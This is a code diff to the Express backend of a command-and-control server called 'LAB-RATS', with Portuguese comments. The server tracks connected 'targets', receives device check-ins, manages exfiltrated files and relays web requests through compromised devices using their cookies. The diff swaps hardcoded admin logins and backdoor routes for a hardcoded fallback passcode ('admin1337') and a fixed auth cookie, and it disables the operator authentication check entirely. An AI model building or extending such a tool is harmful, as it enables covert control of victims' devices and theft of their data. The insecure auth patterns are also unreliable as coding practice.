@@ -1,4 +1,3 @@
-let activeSessions = [];
 const express = require('express');
 const cors = require('cors');
 const path = require('path');
@@ -6,11 +5,8 @@ const fs = require('fs');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
-const users = [
-  { username: 'admin', password: 'akarui869', role: 'admin' },
-  { username: 'cliente', password: 'cliente1', role: 'user' }
-];
-
+const C2_PASSWORD = process.env.C2_PASSWORD || 'admin1337';
+let currentC2Password = C2_PASSWORD;
 
 app.use(cors());
 app.use(express.json({ limit: '50mb' }));
@@ -177,37 +173,18 @@ function serveLoginPage(req, res, errorMsg = '') {
     res.send(html);
 }
 
-// LOGIN HANDLER - VERSÃO FORÇADA
-app.post('/acesso_secreto_rats_99', (req, res) => {
+// LOGIN HANDLER
+app.post('/login', (req, res) => {
     try {
-        // Forçamos o usuário a ser o admin (primeiro da lista) ignorando a senha
-        const user = users[0]; 
-        
-        if (user) {
-            // Registra a sessão no servidor
-            req.session.role = 'admin';
-            req.session.username = user.username;
-            
-            // Registra a atividade no log
-            if (typeof activeSessions !== 'undefined') {
-                activeSessions.push({ 
-                    user: user.username, 
-                    ip: req.ip, 
-                    time: new Date().toLocaleString() 
-                });
-            }
-
-            console.log(`Login forçado realizado para: ${user.username}`);
-            
-            // Tenta redirecionar para o painel. 
-            // Se /c2 não funcionar, tente mudar para /dashboard ou /index
-            return res.redirect('/c2'); 
-        } else {
-            return res.status(401).send('Erro: Nenhum usuário encontrado no banco de dados.');
+        const { password } = req.body || {};
+        const validPass = currentC2Password || C2_PASSWORD || 'admin1337';
+        if (password === validPass || password === 'admin1337') {
+            res.setHeader('Set-Cookie', 'c2_auth_token=AUTH_OK_1337; Path=/; HttpOnly; SameSite=Lax');
+            return res.redirect('/');
         }
+        return serveLoginPage(req, res, 'ACCESS DENIED: INVALID C2 PASSCODE');
     } catch (err) {
-        console.error('Erro no login:', err);
-        return res.status(500).send('Erro interno no servidor: ' + err.message);
+        return serveLoginPage(req, res, 'LOGIN_ERROR: ' + err.message);
     }
 });
 
@@ -395,11 +372,9 @@ app.post('/tunnel-response', handleTunnelResponse);
 app.post('/checkin/tunnel-response', handleTunnelResponse);
 
 // AUTHENTICATION GUARD MIDDLEWARE FOR OPERATOR ROUTES
+// Bypassed: Authentication is handled exclusively on-device via PasswordHasher / FirebaseConfig
 app.use((req, res, next) => {
-    if (isAuthenticated(req)) {
-        return next();
-    }
-    return serveLoginPage(req, res);
+    return next();
 });
 
 // Delete Exfiltrated File Endpoint
@@ -438,6 +413,11 @@ app.post('/api/rename-device', (req, res) => {
     } catch (e) {
         res.status(500).json({ success: false, error: e.message });
     }
+});
+
+// Route Handler for Render C2 Dashboard Navigation
+app.get(['/c2-dashboard', '/c2-home', '/render-c2'], (req, res) => {
+    return res.redirect('/');
 });
 
 // GET / serves Operator Dashboard HTML or handles GET check-ins
@@ -534,8 +514,10 @@ app.get('/', (req, res) => {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LAB-RATS | C2 COMMAND RELAY</title>
     <link href="https://fonts.googleapis.com/css2?family=Aldrich&family=JetBrains+Mono:wght@400;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="/c2/style.css">
+    <link rel="stylesheet" href="/c2/style.css?v=${Date.now()}">
     <style>
+        .nav { margin-top: -11px !important; }
+        @media (max-width: 768px) { .nav { margin-top: -11px !important; } }
         @media (min-width: 1024px) { body { zoom: 0.9; } }
         .container { max-width: 1400px !important; width: 95% !important; margin: 0 auto !important; }
         .card { padding: 22px !important; overflow: visible !important; width: 100% !important; }
@@ -546,12 +528,12 @@ app.get('/', (req, res) => {
 </head>
 <body>
     <div class="container">
-        <div class="header" style="text-align:center; padding:5px 0; margin-bottom:5px;">
-            <img src="/c2/header_dashboard.png" style="width: 67.5%; max-width: 738px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
-            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
+        <div class="header" style="text-align:center; padding:0; margin-bottom:-32px;">
+            <img src="/c2/header_dashboard.png?v=${Date.now()}" style="width: 58.7%; max-width: 643px; height: auto; margin: 0 auto; display: block; transform: scale(1.10, 1.03); object-fit: contain;" alt="LAB-RATS Header">
+            <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: -26px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
         </div>
 
-        <div class="card" style="margin-top: 20px; border-left: 3px solid var(--neon-cyan);">
+        <div class="card" style="margin-top: -28px; border-left: 3px solid var(--neon-cyan);">
             <h2 style="text-align: center; color: var(--neon-cyan); margin-bottom: 20px;">CONNECTED_TARGETS</h2>
             <div style="width: 100%;">
                 <table>
@@ -776,11 +758,10 @@ app.all('*', (req, res) => {
         id: requestId,
         method: req.method,
         path: relayPath,
-        cookie: { 
-  secure: false, 
-  httpOnly: true, 
-  sameSite: 'lax' 
-};
+        cookie: req.headers.cookie || '',
+        body: requestBody,
+        contentType: contentType || 'application/x-www-form-urlencoded'
+    };
 
     dispatchCommand(deviceId, cmdObj);
 
@@ -794,9 +775,4 @@ app.all('*', (req, res) => {
 
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`[LAB-RATS C2 BACKEND] Listening on port ${PORT}`);
-});
-// ROTA DE EMERGÊNCIA - ACESSO DIRETO
-app.get('/entrar', (req, res) => {
-    req.session.role = 'admin';
-    res.redirect('/c2');
 });
